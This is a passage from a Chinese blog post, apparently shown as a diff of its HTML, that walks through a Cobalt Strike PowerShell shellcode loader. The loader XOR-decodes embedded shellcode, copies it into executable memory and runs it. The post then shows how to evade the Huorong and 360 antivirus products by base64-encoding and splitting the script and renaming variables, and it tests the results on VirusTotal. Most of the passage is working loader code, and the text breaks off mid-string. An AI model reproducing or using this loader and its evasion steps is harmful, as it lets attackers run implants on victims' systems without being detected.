class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Dolt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">	Param ($var_module, $var_procedure)		</span></span><br><span class="line"><span class="string">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">	Param (</span></span><br><span class="line"><span class="string">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">	)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckt3PCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMT2R3diMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCi4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMNEhMNEhMNEhIXIyMjIyM=&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">	$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$Dolt</span>  | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$Dolt</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>这是cs生成原始的powershell payload</p>
-<p>这里把 $Dolt @‘’@ 里面的内容进行base64 然后再使用一个变量去base64解码，再更改一下变量名 即可绕过火绒、360</p>
+<p>这里把 $Dolt @‘’@ 里面的内容进行base64
+然后再使用一个变量去base64解码，再更改一下变量名 即可绕过火绒、360</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">$AAA = @&#x27;</span><br><span class="line">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnNBbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($AAA))</span><br><span class="line">If ([IntPtr]::size -eq 8) &#123;</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $bbb | wait-job | Receive-Job</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $bbb  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/adb63639/23.png" alt="截图"></p>
-<p><img src="/posts/adb63639/24.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/23.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/adb63639/24.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>上传到VT</p>
-<p> <img src="/posts/adb63639/25.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/25.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>发现查杀率还是较高，然后可以差分一些上面的$AAA变量</p>
 <p>接下来将$AAA变量就随便分成4部分 然后再拼接起来看看VT上的效果</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$AAA</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnNBbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = <span class="string">&#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3V&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span> = <span class="string">&#x27;uc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVma